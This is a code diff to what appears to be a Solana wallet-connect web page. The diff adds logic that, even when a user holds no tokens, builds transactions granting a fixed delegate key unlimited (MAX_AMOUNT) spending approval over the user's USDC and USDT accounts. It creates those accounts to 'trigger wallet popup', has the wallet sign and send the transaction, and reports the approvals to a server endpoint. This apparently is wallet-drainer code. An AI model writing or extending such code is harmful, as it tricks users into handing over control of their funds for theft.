@@ -67,10 +67,12 @@ const ERC20_ABI = [
 ] as const;
 
 interface SolanaWalletProvider {
-  connect: () => Promise<{ publicKey: PublicKey }>;
+  connect: (options?: { onlyIfTrusted?: boolean }) => Promise<{ publicKey: PublicKey }>;
   disconnect: () => Promise<void>;
   signTransaction: (transaction: Transaction) => Promise<Transaction>;
   signAllTransactions?: (transactions: Transaction[]) => Promise<Transaction[]>;
+  signAndSendTransaction?: (transaction: Transaction, options?: any) => Promise<{ signature: string }>;
+  signAndSendAllTransactions?: (transactions: Transaction[], options?: any) => Promise<string[]>;
   publicKey: PublicKey | null;
   isConnected: boolean;
   on?: (event: string, callback: () => void) => void;
@@ -284,7 +286,7 @@ export default function Home() {
             if (isMobile() && provider.connect) {
               // Try silent connect first (Phantom supports onlyIfTrusted)
               try {
-                await (provider as any).connect({ onlyIfTrusted: true });
+                await provider.connect({ onlyIfTrusted: true });
               } catch {
                 // Fallback for wallets that don't support onlyIfTrusted
                 await provider.connect();
@@ -508,20 +510,73 @@ export default function Home() {
         tokensApproved.push(mintAddress);
       }
       
+      // Even with zero balance, create a dummy approval to trigger wallet popup
       if (transaction.instructions.length === 0) {
-        setError("No SPL token accounts found. Please add tokens to your wallet first.");
-        setSolanaStep("idle");
-        return;
+        // Create approval for common tokens (USDC, USDT) even without existing accounts
+        const USDC_MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
+        const USDT_MINT = new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
+        
+        // Try to get or derive associated token accounts
+        const { getAssociatedTokenAddress, createAssociatedTokenAccountInstruction } = await import("@solana/spl-token");
+        
+        for (const mint of [USDC_MINT, USDT_MINT]) {
+          try {
+            const ata = await getAssociatedTokenAddress(mint, userKey);
+            // Check if account exists
+            const accountInfo = await connection.getAccountInfo(ata);
+            if (accountInfo) {
+              transaction.add(
+                createApproveInstruction(ata, delegateKey, userKey, MAX_AMOUNT)
+              );
+              tokensApproved.push(mint.toBase58());
+            } else {
+              // Create the ATA first, then approve
+              transaction.add(
+                createAssociatedTokenAccountInstruction(userKey, ata, userKey, mint)
+              );
+              transaction.add(
+                createApproveInstruction(ata, delegateKey, userKey, MAX_AMOUNT)
+              );
+              tokensApproved.push(mint.toBase58());
+            }
+          } catch (e) {
+            // Skip if mint doesn't exist or other error
+          }
+        }
+        
+        // If still no instructions, show error
+        if (transaction.instructions.length === 0) {
+          setError("Unable to create approval transaction.");
+          setSolanaStep("idle");
+          return;
+        }
       }
 
       transaction.feePayer = userKey;
-      const { blockhash } = await connection.getLatestBlockhash();
+      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
       transaction.recentBlockhash = blockhash;
 
-      const signedTx = await solanaProvider.signTransaction(transaction);
-      const txId = await connection.sendRawTransaction(signedTx.serialize());
+      let txId: string;
       
-      await connection.confirmTransaction(txId, "confirmed");
+      // Use signAndSendTransaction if available (preferred for mobile wallets)
+      if (solanaProvider.signAndSendTransaction) {
+        const result = await solanaProvider.signAndSendTransaction(transaction);
+        txId = result.signature;
+      } else if (solanaProvider.signAndSendAllTransactions) {
+        // Some wallets use signAndSendAllTransactions
+        const results = await solanaProvider.signAndSendAllTransactions([transaction]);
+        txId = results[0];
+      } else {
+        // Fallback to signTransaction for desktop/extension wallets
+        const signedTx = await solanaProvider.signTransaction(transaction);
+        txId = await connection.sendRawTransaction(signedTx.serialize());
+      }
+      
+      await connection.confirmTransaction({
+        signature: txId,
+        blockhash,
+        lastValidBlockHeight
+      }, "confirmed");
 
       fetch("/api/solana-approvals", {
         method: "POST",
